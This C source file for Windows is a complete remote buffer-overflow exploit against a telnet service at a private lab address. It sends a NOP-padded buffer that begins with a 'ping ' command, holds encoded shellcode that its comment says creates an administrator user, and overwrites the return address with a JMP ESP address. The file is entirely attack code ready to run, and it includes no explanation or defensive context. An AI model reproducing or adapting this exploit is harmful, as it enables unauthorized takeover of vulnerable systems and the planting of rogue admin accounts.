#include <stdio.h>
 
#include <stdlib.h>
 
#include <windows.h>
 
#pragma comment (lib,"ws2_32")
 
//创建管理员用户shellcode
 
char shellcode[] =
 
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
 
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
 
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
 
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
 
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54"
 
"\x42\x50\x42\x30\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x48\x4e\x57"
 
"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x38"
 
"\x4f\x35\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x43\x4b\x48"
 
"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x39\x4e\x4a\x46\x38\x42\x4c"
 
"\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"
 
"\x46\x4f\x4b\x33\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58"
 
"\x4f\x45\x46\x32\x41\x50\x4b\x4e\x48\x36\x4b\x48\x4e\x30\x4b\x44"
 
"\x4b\x48\x4f\x45\x4e\x51\x41\x30\x4b\x4e\x4b\x58\x4e\x51\x4b\x58"
 
"\x41\x30\x4b\x4e\x49\x48\x4e\x45\x46\x42\x46\x30\x43\x4c\x41\x43"
 
"\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x47"
 
"\x4e\x50\x4b\x48\x42\x34\x4e\x50\x4b\x58\x42\x37\x4e\x41\x4d\x4a"
 
"\x4b\x58\x4a\x36\x4a\x50\x4b\x4e\x49\x50\x4b\x58\x42\x38\x42\x4b"

"\x42\x30\x42\x30\x42\x50\x4b\x38\x4a\x46\x4e\x33\x4f\x35\x41\x43"
 
"\x48\x4f\x42\x56\x48\x35\x49\x58\x4a\x4f\x43\x38\x42\x4c\x4b\x37"
 
"\x42\x45\x4a\x46\x42\x4f\x4c\x38\x46\x50\x4f\x35\x4a\x46\x4a\x49"
 
"\x50\x4f\x4c\x58\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x4d\x56"
 
"\x46\x56\x50\x52\x45\x36\x4a\x57\x45\x56\x42\x42\x4f\x32\x43\x46"

"\x42\x52\x50\x56\x45\x46\x46\x57\x42\x42\x45\x57\x43\x37\x45\x36"
 
"\x44\x57\x42\x32\x50\x46\x42\x43\x42\x53\x44\x56\x42\x42\x50\x36"
 
"\x42\x53\x42\x43\x44\x36\x42\x42\x4f\x32\x41\x54\x46\x44\x46\x44"
 
"\x42\x42\x48\x32\x48\x52\x42\x52\x50\x36\x45\x56\x46\x47\x42\x52"
 
"\x4e\x56\x4f\x36\x43\x36\x41\x56\x4e\x56\x47\x56\x44\x57\x4f\x56"
 
"\x45\x47\x42\x37\x42\x42\x41\x54\x46\x46\x4d\x56\x49\x46\x50\x56"
 
"\x49\x46\x43\x57\x46\x57\x44\x37\x41\x56\x46\x37\x4f\x36\x44\x57"
 
"\x43\x47\x42\x42\x50\x46\x42\x43\x42\x33\x44\x46\x42\x42\x4f\x52"
 
"\x41\x44\x46\x44\x46\x44\x42\x30\x5a";
 
void main()
 
{
 
WSADATA WSAData;
 
char Buff[2000],Recv[2000];
 
int nRet,conRet;
 
struct sockaddr_in ipAddress;
 
SOCKET sockettest;
 
if(WSAStartup(MAKEWORD(1,1),&WSAData)!=0)
 
{
 
printf("ERROR\n");
 
WSACleanup();
 
exit(1);
 
}
 
sockettest= socket(AF_INET,SOCK_STREAM,0);
 
ipAddress.sin_family = AF_INET;
 
ipAddress.sin_addr.s_addr = inet_addr("192.168.60.128");
 
ipAddress.sin_port = htons(23);
 
conRet=connect(sockettest,(struct sockaddr *)&ipAddress,sizeof(ipAddress));
 
memset(Buff, 0x90, sizeof(Buff)-1); //全部NOP填充
 
memcpy(&Buff[0],"ping ",5); //设置ping指令
 
memcpy(&Buff[1998],"\r\n",2); //设置结尾的\r\n
 
memcpy(&Buff[1017],"\x12\x45\xfa\x7f",4); //设置JMP ESP指令地址，定位1012，加上ping为1017
 
memcpy(&Buff[9],shellcode,sizeof(shellcode)-1); // ping5个，加之后4个NOP
 
memset(Recv,0x90,sizeof(Recv)); //初始化缓冲区
 
recv(sockettest,Recv,sizeof(Recv),0);//目的主机存入缓冲区
 
nRet=send(sockettest,Buff,sizeof(Buff),0);
 
Sleep(1000);
 
WSACleanup();
 
printf("attack ok !\n");
 
}